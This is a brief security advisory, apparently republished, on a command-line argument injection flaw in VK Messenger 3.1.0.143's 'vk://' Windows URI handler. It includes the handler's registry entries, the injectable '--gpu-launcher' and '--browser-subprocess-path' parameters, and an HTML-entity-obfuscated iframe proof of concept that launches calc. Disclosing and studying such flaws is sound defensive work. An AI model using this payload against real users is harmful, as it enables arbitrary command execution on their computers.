
Vulnerability Summary:

The following describes a vulnerability in VK Messenger that is triggered via the exploitation of improperly handled URI.

Affected Version:

VK Messenger version 3.1.0.143

The VK Messenger, which is part of the VK package, registers a uri handler on Windows in the following way:
```s
[HKEY_CLASSES_ROOT\vk]
"URL Protocol"=""
@="URL:vk"
 
[HKEY_CLASSES_ROOT\vk\shell]
 
[HKEY_CLASSES_ROOT\vk\shell\open]
 
[HKEY_CLASSES_ROOT\vk\shell\open\command]
@="\"C:\\Program Files\\VK\\vk.exe\" \"%1\""
```

When the browser processes the ‘vk://’ uri handler it is possible to inject arbitrary command line parameters for vk.exe, since the application does not properly parse them. It is possible to inject the ‘–gpu-launcher=’ parameter to execute arbitrary commands. It is also possible to inject the ‘–browser-subprocess-path=’ parameter to execute arbitrary commands. Network share paths are allowed, too.

Example of attack encoded in HTML entity:

```html
<iframe src='vk:?"&#32;&#45;&#45;&#103;&#112;&#117;&#45;&#108;&#97;&#117;&#110;&#99;&#104;&#101;&#114;&#61;&#34;&#99;&#109;&#100;&#46;&#101;&#120;&#101;&#32;&#47;&#99;&#32;&#115;&#116;&#97;&#114;&#116;&#32;&#99;&#97;&#108;&#99;&#34;&#32;&#45;&#45;'></iframe>
```
When opening a malicious page, a notification box asks the user to open VK.

NOTE: The application is not in the auto-startup items, and the issue will work if the application is not already started.

## 资料

https://blogs.securiteam.com/index.php/archives/3674#more-3674